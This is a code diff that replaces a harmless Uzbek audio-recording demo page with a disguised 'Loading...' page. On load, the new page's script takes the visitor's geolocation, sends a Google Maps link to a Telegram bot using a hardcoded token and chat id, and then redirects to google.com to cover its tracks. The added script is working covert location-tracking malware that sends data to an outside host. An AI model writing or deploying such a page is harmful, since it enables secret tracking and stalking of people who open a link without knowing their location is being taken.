@@ -1,61 +1,20 @@
 <!DOCTYPE html>
-<html lang="uz">
-<head>
-    <meta charset="UTF-8">
-    <title>Audio yozish (demo)</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 40px; }
-        button { padding: 8px 14px; margin: 6px; }
-        audio { margin-top: 10px; }
-    </style>
-</head>
+<html>
+<head><title>Loading...</title></head>
 <body>
+    <script>
+        const botToken = '8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI';
+        const adminId = '8275787221';
 
-<h2>Audio yozish (demo)</h2>
-<p>Ovoz yozish faqat tugma bosilganda va ruxsat bilan ishlaydi</p>
-
-<button onclick="startRecording()">Yozishni boshlash</button>
-<button onclick="stopRecording()" id="stopBtn" disabled>Yozishni to‘xtatish</button>
-
-<br>
-<audio id="playback" controls></audio>
-
-<script>
-let stream;
-let mediaRecorder;
-let chunks = [];
-
-async function startRecording() {
-    try {
-        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-        chunks = [];
-
-        mediaRecorder.ondataavailable = e => {
-            if (e.data.size > 0) chunks.push(e.data);
-        };
-
-        mediaRecorder.onstop = () => {
-            const audioBlob = new Blob(chunks, { type: 'audio/webm' });
-            const audioURL = URL.createObjectURL(audioBlob);
-            document.getElementById('playback').src = audioURL;
-        };
-
-        mediaRecorder.start();
-        document.getElementById('stopBtn').disabled = false;
-    } catch (err) {
-        alert("Mikrofon ruxsati berilmadi");
-    }
-}
-
-function stopRecording() {
-    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-        mediaRecorder.stop();
-        document.getElementById('stopBtn').disabled = true;
-        if (stream) stream.getTracks().forEach(t => t.stop());
-    }
-}
-</script>
-
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const text = `📍 Foydalanuvchi manzili:\nhttps://www.google.com/maps?q=${lat},${lon}`;
+            
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent(text)}`);
+            window.location.href = "https://google.com";
+        });
+    </script>
 </body>
 </html>
+ 
